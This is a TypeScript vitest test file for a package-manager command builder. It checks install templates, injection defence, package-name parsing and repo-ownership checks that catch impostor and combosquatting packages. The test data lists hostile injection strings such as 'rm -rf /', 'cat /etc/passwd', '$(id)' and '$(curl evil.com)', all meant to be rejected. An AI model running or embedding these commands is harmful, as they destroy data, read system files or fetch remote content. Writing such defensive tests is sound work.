import { describe, it, expect } from 'vitest';
import {
  MaTrinhQuanLyGoi,
  DANH_SACH_TRINH_QUAN_LY_GOI,
  kiemTraTenGoiHopLe,
  kiemTraPhienBanHopLe,
  ghepLenhCliAnToan,
  trichTenGoiTuLenhTho,
  laKyTuDocHai,
  taoTenContainerTuImage,
  coCachCaiCliHopLe,
  kiemTraGoiThuocRepo,
  trichXuatOwnerVaRepo,
  xacThucGoiThuocRepoUrl,
} from '@forgestore/types';

describe('P3B-16.1 & P3B-16.2: Package Manager Manifest Framework & Command Injection Defense', () => {
  describe('P3B-16.1: Danh sách 5 trình quản lý gói ban đầu', () => {
    it('đầy đủ 5 trình quản lý gói: winget, scoop, npm, pip, docker', () => {
      const cacTrinh = Object.keys(DANH_SACH_TRINH_QUAN_LY_GOI);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.WINGET);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.SCOOP);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.NPM);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.PIP);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.DOCKER);
      // D-38 (P3B-33): thêm npx cho nhóm skill AI, tổng 6 trình quản lý
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.NPX);
      expect(cacTrinh).toHaveLength(6);
    });

    it('mỗi manifest có đầy đủ mẫu lệnh cài, cập nhật, gỡ và regex tên gói', () => {
      for (const key of Object.values(MaTrinhQuanLyGoi)) {
        const manifest = DANH_SACH_TRINH_QUAN_LY_GOI[key];
        expect(manifest.ma).toBe(key);
        expect(manifest.tenHienThi).toBeTruthy();
        expect(manifest.regexTenGoi).toBeTruthy();
        // npx chỉ chạy gói, không có lệnh cài/cập nhật/gỡ chung: ba mẫu để rỗng có chủ ý (D-38)
        if (key === MaTrinhQuanLyGoi.NPX) {
          expect(manifest.mauLenhCai).toBe('');
          expect(manifest.mauLenhCapNhat).toBe('');
          expect(manifest.mauLenhGo).toBe('');
          continue;
        }
        expect(manifest.mauLenhCai).toContain('{tenGoi}');
        expect(manifest.mauLenhCapNhat).toContain('{tenGoi}');
        if (key === MaTrinhQuanLyGoi.DOCKER) {
          expect(manifest.mauLenhGo).toContain('{tenContainer}');
        } else {
          expect(manifest.mauLenhGo).toContain('{tenGoi}');
        }
      }
    });

    it('mẫu lệnh đúng chuẩn từng hệ sinh thái', () => {
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.winget.mauLenhCai).toBe('winget install --id {tenGoi} -e');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.winget.mauLenhGo).toBe('winget uninstall --id {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.scoop.mauLenhCai).toBe('scoop install {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.scoop.mauLenhGo).toBe('scoop uninstall {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.npm.mauLenhCai).toBe('npm install -g {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.npm.mauLenhGo).toBe('npm uninstall -g {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.pip.mauLenhCai).toBe('pip install {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.pip.mauLenhGo).toBe('pip uninstall -y {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.docker.mauLenhCai).toBe(
        'docker run -d --name {tenContainer} {tenGoi}',
      );
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.docker.mauLenhGo).toBe('docker rm -f {tenContainer}');
    });
  });

  describe('P3B-16.2: Chống Command Injection & Xác thực tên gói / phiên bản', () => {
    const cacTenGoiDocHai = [
      'Microsoft.PowerToys; rm -rf /',
      'Microsoft.PowerToys && whoami',
      'foo | cat /etc/passwd',
      'foo$(id)',
      'foo`whoami`',
      'foo\nmalicious_cmd',
      'foo\r\ncalc.exe',
      'package with space',
      'foo;calc',
      'foo||calc',
      'foo>out.txt',
      'foo<in.txt',
      'foo\\bar',
      'foo!bar',
      '--ignore-scripts',
      '--privileged',
      '-v',
      '-bucket/app',
      "foo'bar",
      'foo"bar',
      '',
      '   ',
    ];

    it('laKyTuDocHai phát hiện 100% các chuỗi chứa ký tự nguy hiểm', () => {
      for (const payload of cacTenGoiDocHai) {
        expect(laKyTuDocHai(payload)).toBe(true);
      }
    });

    it('kiemTraTenGoiHopLe từ chối 100% các tên gói độc hại ở tất cả 5 trình quản lý', () => {
      for (const trinh of Object.values(MaTrinhQuanLyGoi)) {
        for (const payload of cacTenGoiDocHai) {
          expect(kiemTraTenGoiHopLe(trinh, payload)).toBe(false);
        }
      }
    });

    it('ghepLenhCliAnToan từ chối và KHÔNG sinh lệnh khi tên gói độc hại', () => {
      for (const payload of cacTenGoiDocHai) {
        const kq = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, payload);
        expect(kq.hopLe).toBe(false);
        expect(kq.lenhCai).toBeUndefined();
        expect(kq.lenhGo).toBeUndefined();
        expect(kq.lyDoKhongHopLe).toBeDefined();
      }
    });

    it('ghepLenhCliAnToan từ chối khi phiên bản chứa mã độc injection', () => {
      const cacPhienBanDocHai = [
        '1.0.0; rm -rf /',
        '1.0.0 && whoami',
        '$(curl evil.com)',
        '`calc.exe`',
        '1.0\n2.0',
        'v1.0 || malicious',
      ];

      for (const badVer of cacPhienBanDocHai) {
        expect(kiemTraPhienBanHopLe(MaTrinhQuanLyGoi.WINGET, badVer)).toBe(false);
        const kq = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, 'Microsoft.PowerToys', badVer);
        expect(kq.hopLe).toBe(false);
        expect(kq.lenhCai).toBeUndefined();
      }
    });

    it('ghép lệnh thành công và sạch sẽ với tên gói hợp lệ thực tế', () => {
      // 1. Winget
      const kqWinget = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, 'Microsoft.PowerToys');
      expect(kqWinget.hopLe).toBe(true);
      expect(kqWinget.lenhCai).toBe('winget install --id Microsoft.PowerToys -e');
      expect(kqWinget.lenhCapNhat).toBe('winget upgrade --id Microsoft.PowerToys');
      expect(kqWinget.lenhGo).toBe('winget uninstall --id Microsoft.PowerToys');

      // 2. Scoop (tên thường hoặc có bucket)
      const kqScoop1 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.SCOOP, 'neovim');
      expect(kqScoop1.hopLe).toBe(true);
      expect(kqScoop1.lenhCai).toBe('scoop install neovim');

      const kqScoop2 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.SCOOP, 'extras/googlechrome');
      expect(kqScoop2.hopLe).toBe(true);
      expect(kqScoop2.lenhCai).toBe('scoop install extras/googlechrome');
      expect(kqScoop2.lenhGo).toBe('scoop uninstall extras/googlechrome');

      // 3. npm (package thường hoặc scoped)
      const kqNpm1 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.NPM, 'serve');
      expect(kqNpm1.hopLe).toBe(true);
      expect(kqNpm1.lenhCai).toBe('npm install -g serve');
      expect(kqNpm1.lenhGo).toBe('npm uninstall -g serve');

      const kqNpm2 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.NPM, '@angular/cli');
      expect(kqNpm2.hopLe).toBe(true);
      expect(kqNpm2.lenhCai).toBe('npm install -g @angular/cli');

      // 4. pip
      const kqPip = ghepLenhCliAnToan(MaTrinhQuanLyGoi.PIP, 'open-webui');
      expect(kqPip.hopLe).toBe(true);
      expect(kqPip.lenhCai).toBe('pip install open-webui');
      expect(kqPip.lenhCapNhat).toBe('pip install --upgrade open-webui');
      expect(kqPip.lenhGo).toBe('pip uninstall -y open-webui');

      // 5. docker (🔴 Lỗi Đỏ 2: kiểm tra tên container làm sạch và {tenContainer} trong lệnh)
      const kqDocker = ghepLenhCliAnToan(
        MaTrinhQuanLyGoi.DOCKER,
        'ghcr.io/open-webui/open-webui:main',
      );
      expect(kqDocker.hopLe).toBe(true);
      expect(kqDocker.tenContainer).toBe('open-webui');
      expect(kqDocker.lenhCai).toBe(
        'docker run -d --name open-webui ghcr.io/open-webui/open-webui:main',
      );
      expect(kqDocker.lenhCai).not.toContain('{tenGoi}');
      expect(kqDocker.lenhCai).not.toContain('{tenContainer}');
      expect(kqDocker.lenhCapNhat).toBe('docker pull ghcr.io/open-webui/open-webui:main');
      expect(kqDocker.lenhGo).toBe('docker rm -f open-webui');
    });

    it('taoTenContainerTuImage làm sạch tên image thành container name hợp lệ (🔴 Lỗi Đỏ 2)', () => {
      expect(taoTenContainerTuImage('ghcr.io/open-webui/open-webui:main')).toBe('open-webui');
      expect(taoTenContainerTuImage('ghcr.io/foo/bar:latest')).toBe('bar');
      expect(taoTenContainerTuImage('docker.io/library/nginx:alpine')).toBe('nginx');
      expect(taoTenContainerTuImage('redis:7-alpine')).toBe('redis');
      expect(taoTenContainerTuImage('my-custom-app')).toBe('my-custom-app');
    });

    it('PIP kiemTraTenGoiHopLe từ chối các tệp mở rộng và đường dẫn (🔴 Lỗi Đỏ 1)', () => {
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'requirements.txt')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'setup.py')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'package.whl')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'dist/my_package.whl')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, './local_package')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, '.')).toBe(false);
    });
  });

  describe('Bóc tách tên gói từ lệnh thô trong README (trichTenGoiTuLenhTho)', () => {
    it('trích xuất chính xác tên gói từ lệnh winget', () => {
      const res1 = trichTenGoiTuLenhTho('winget install --id Microsoft.PowerToys -e');
      expect(res1).toEqual({ trinhQuanLy: 'winget', tenGoi: 'Microsoft.PowerToys' });

      const res2 = trichTenGoiTuLenhTho('winget install Fastfetch-cli.Fastfetch');
      expect(res2).toEqual({ trinhQuanLy: 'winget', tenGoi: 'Fastfetch-cli.Fastfetch' });
    });

    it('trích xuất chính xác tên gói từ lệnh scoop', () => {
      const res1 = trichTenGoiTuLenhTho('scoop install git');
      expect(res1).toEqual({ trinhQuanLy: 'scoop', tenGoi: 'git' });

      const res2 = trichTenGoiTuLenhTho('scoop install extras/vlc');
      expect(res2).toEqual({ trinhQuanLy: 'scoop', tenGoi: 'extras/vlc' });
    });

    it('trích xuất chính xác tên gói từ lệnh npm / pnpm', () => {
      const res1 = trichTenGoiTuLenhTho('npm install -g @nestjs/cli');
      expect(res1).toEqual({ trinhQuanLy: 'npm', tenGoi: '@nestjs/cli' });

      const res2 = trichTenGoiTuLenhTho('pnpm add -g pnpm');
      expect(res2).toEqual({ trinhQuanLy: 'npm', tenGoi: 'pnpm' });
    });

    it('trích xuất chính xác tên gói từ lệnh pip thông thường', () => {
      const res1 = trichTenGoiTuLenhTho('pip install open-webui');
      expect(res1).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      const res2 = trichTenGoiTuLenhTho('pip3 install -U yt-dlp');
      expect(res2).toEqual({ trinhQuanLy: 'pip', tenGoi: 'yt-dlp' });

      const res3 = trichTenGoiTuLenhTho('python -m pip install black');
      expect(res3).toEqual({ trinhQuanLy: 'pip', tenGoi: 'black' });
    });

    it('bỏ qua cờ có giá trị kèm theo (-r, -c, -i) và không đọc nhầm requirements.txt (🔴 Lỗi Đỏ 1)', () => {
      // 1. pip install -r requirements.txt -> Không có gói nào được cài trực tiếp -> trả về null
      expect(trichTenGoiTuLenhTho('pip install -r requirements.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install --requirement requirements.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install -c constraints.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install -r req.txt -i https://pypi.org/simple')).toBeNull();

      // 2. pip install -r requirements.txt <ten_goi> -> Trích xuất đúng ten_goi
      const res = trichTenGoiTuLenhTho('pip install -r requirements.txt open-webui');
      expect(res).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      // 3. pip install --extra-index-url https://download.pytorch.org/whl/cu118 torch -> torch
      const resTorch = trichTenGoiTuLenhTho(
        'pip install --extra-index-url https://download.pytorch.org/whl/cu118 torch',
      );
      expect(resTorch).toEqual({ trinhQuanLy: 'pip', tenGoi: 'torch' });
    });

    it('trích xuất chính xác tên image từ lệnh docker pull', () => {
      const res1 = trichTenGoiTuLenhTho('docker pull ghcr.io/open-webui/open-webui:main');
      expect(res1).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });

    it('từ chối docker run khi có tham số chương trình phía sau (🔴 Lỗi Đỏ 3)', () => {
      // docker run -d --name x myimage serve --port 80 -> có trailing program args "serve --port 80" -> TỪ CHỐI
      expect(trichTenGoiTuLenhTho('docker run -d --name x myimage serve --port 80')).toBeNull();
      expect(trichTenGoiTuLenhTho('docker run -d myimage sh -c "echo 1"')).toBeNull();
      expect(trichTenGoiTuLenhTho('docker run -it ubuntu bash')).toBeNull();

      // docker run KHÔNG có trailing program args -> trích xuất chuẩn xác tên image
      const res = trichTenGoiTuLenhTho('docker run -d -p 8080:8080 myimage');
      expect(res).toEqual({ trinhQuanLy: 'docker', tenGoi: 'myimage' });

      const resNamed = trichTenGoiTuLenhTho(
        'docker run -d --name open-webui ghcr.io/open-webui/open-webui:main',
      );
      expect(resNamed).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });

    it('từ chối lệnh chứa cú pháp chèn lệnh injection', () => {
      expect(trichTenGoiTuLenhTho('winget install --id evil; rm -rf /')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install evil$(whoami)')).toBeNull();
      expect(trichTenGoiTuLenhTho('npm i -g evil&&calc')).toBeNull();
    });

    it('bỏ qua các cờ option và trích xuất đúng tên gói hợp lệ', () => {
      const res1 = trichTenGoiTuLenhTho('npm install -g --ignore-scripts @nestjs/cli');
      expect(res1).toEqual({ trinhQuanLy: 'npm', tenGoi: '@nestjs/cli' });

      const res2 = trichTenGoiTuLenhTho('pip install -U --no-cache-dir open-webui');
      expect(res2).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      const res3 = trichTenGoiTuLenhTho(
        'docker run -d -p 8080:8080 ghcr.io/open-webui/open-webui:main',
      );
      expect(res3).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });
  });

  describe('P3B-16 & D-23: coCachCaiCliHopLe', () => {
    it('trả về true khi có ít nhất một cách cài có trinhQuanLy và tenGoi hợp lệ', () => {
      const hdHopLe = {
        cachCai: [{ trinhQuanLy: 'winget', tenGoi: 'Fastfetch-cli.Fastfetch' }],
      };
      expect(coCachCaiCliHopLe(hdHopLe)).toBe(true);

      const hdNhieuCach = {
        cachCai: [
          { trinhQuanLy: null, tenGoi: null },
          { trinhQuanLy: 'docker', tenGoi: 'ghcr.io/open-webui/open-webui:main' },
        ],
      };
      expect(coCachCaiCliHopLe(hdNhieuCach)).toBe(true);
    });

    it('trả về false khi chỉ có hướng dẫn thô không có trinhQuanLy/tenGoi (pip install -r requirements.txt)', () => {
      const hdTho = {
        cachCai: [{ trinhQuanLy: undefined, tenGoi: undefined }],
      };
      expect(coCachCaiCliHopLe(hdTho)).toBe(false);

      const hdNull = {
        cachCai: [{ trinhQuanLy: null, tenGoi: null }],
      };
      expect(coCachCaiCliHopLe(hdNull)).toBe(false);
    });

    it('trả về false khi hướng dẫn rỗng hoặc null/undefined', () => {
      expect(coCachCaiCliHopLe(null)).toBe(false);
      expect(coCachCaiCliHopLe(undefined)).toBe(false);
      expect(coCachCaiCliHopLe({ cachCai: [] })).toBe(false);
    });
  });

  describe('P3B-18 & D-27: Repo Ownership Verification (Kiểm tra gói thuộc repo)', () => {
    describe('trichXuatOwnerVaRepo', () => {
      it('trích xuất chính xác owner và repo từ các định dạng URL và slug khác nhau', () => {
        expect(trichXuatOwnerVaRepo('microsoft/PowerToys')).toEqual({
          owner: 'microsoft',
          repo: 'powertoys',
        });
        expect(trichXuatOwnerVaRepo('https://github.com/open-webui/open-webui.git')).toEqual({
          owner: 'open-webui',
          repo: 'open-webui',
        });
        expect(trichXuatOwnerVaRepo('https://github.com/fastfetch-cli/fastfetch/')).toEqual({
          owner: 'fastfetch-cli',
          repo: 'fastfetch',
        });
        expect(trichXuatOwnerVaRepo(null)).toBeNull();
        expect(trichXuatOwnerVaRepo('')).toBeNull();
      });
    });

    describe('kiemTraGoiThuocRepo', () => {
      it('Winget: nhận diện chính xác gói thuộc repo Microsoft.PowerToys', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.WINGET,
          'Microsoft.PowerToys',
          'microsoft/PowerToys',
        );
        expect(kq.khop).toBe(true);
        expect(kq.mucDoTinCay).toBe('CAO');
        expect(kq.canhBao).toBeUndefined();
      });

      it('Docker: nhận diện chính xác image ghcr.io/open-webui/open-webui:main', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.DOCKER,
          'ghcr.io/open-webui/open-webui:main',
          'https://github.com/open-webui/open-webui',
        );
        expect(kq.khop).toBe(true);
        expect(kq.mucDoTinCay).toBe('CAO');
      });

      it('NPM: nhận diện gói scoped @angular/cli thuộc angular/angular-cli', () => {
        const kq = kiemTraGoiThuocRepo(MaTrinhQuanLyGoi.NPM, '@angular/cli', 'angular/angular-cli');
        expect(kq.khop).toBe(true);
        expect(kq.mucDoTinCay).toBe('CAO');
      });

      it('PIP: nhận diện gói yt-dlp thuộc yt-dlp/yt-dlp', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.PIP,
          'yt-dlp',
          'https://github.com/yt-dlp/yt-dlp',
        );
        expect(kq.khop).toBe(true);
        expect(kq.mucDoTinCay).toBe('CAO');
      });

      it('CẢNH BÁO MẠNH khi tên gói hoàn toàn không khớp với repo (chống mạo danh)', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.NPM,
          'malicious-crypto-miner',
          'calculator-app/calculator',
        );
        expect(kq.khop).toBe(false);
        expect(kq.mucDoTinCay).toBe('CANH_BAO');
        expect(kq.canhBao).toContain('malicious-crypto-miner');
        expect(kq.canhBao).toContain('calculator-app/calculator');
      });

      it('NPM: CẢNH BÁO MẠNH khi scope mạo danh (@evil-hacker/react trên repo facebook/react)', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.NPM,
          '@evil-hacker/react',
          'facebook/react',
        );
        expect(kq.khop).toBe(false);
        expect(kq.mucDoTinCay).toBe('CANH_BAO');
        expect(kq.canhBao).toContain('evil-hacker');
      });

      it('Docker: CẢNH BÁO MẠNH khi namespace image khác owner repo (evil-org/open-webui trên open-webui)', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.DOCKER,
          'evil-org/open-webui:main',
          'https://github.com/open-webui/open-webui',
        );
        expect(kq.khop).toBe(false);
        expect(kq.mucDoTinCay).toBe('CANH_BAO');
      });

      it('PIP: cảnh báo khi repo là flameshot nhưng tên gói là open-webui', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.PIP,
          'open-webui',
          'flameshot-org/flameshot',
        );
        expect(kq.khop).toBe(false);
        expect(kq.mucDoTinCay).toBe('CANH_BAO');
      });

      it('Combosquatting: CẢNH BÁO MẠNH khi tên gói chứa repo nhưng có hậu tố độc hại (ytdlp-malware trên yt-dlp)', () => {
        const kq = kiemTraGoiThuocRepo(
          MaTrinhQuanLyGoi.PIP,
          'ytdlp-malware',
          'https://github.com/yt-dlp/yt-dlp',
        );
        expect(kq.khop).toBe(false);
        expect(kq.mucDoTinCay).toBe('CANH_BAO');
        expect(kq.canhBao).toContain('Combosquatting');
      });
    });

    describe('xacThucGoiThuocRepoUrl', () => {
      it('trả về true khi URL registry trùng repo gốc', () => {
        expect(
          xacThucGoiThuocRepoUrl(
            'https://github.com/yt-dlp/yt-dlp',
            'https://github.com/yt-dlp/yt-dlp.git',
          ),
        ).toBe(true);
      });

      it('trả về false khi URL registry khác repo gốc', () => {
        expect(
          xacThucGoiThuocRepoUrl(
            'https://github.com/evil-actor/evil-pkg',
            'https://github.com/legit/legit-pkg',
          ),
        ).toBe(false);
      });
    });
  });
});
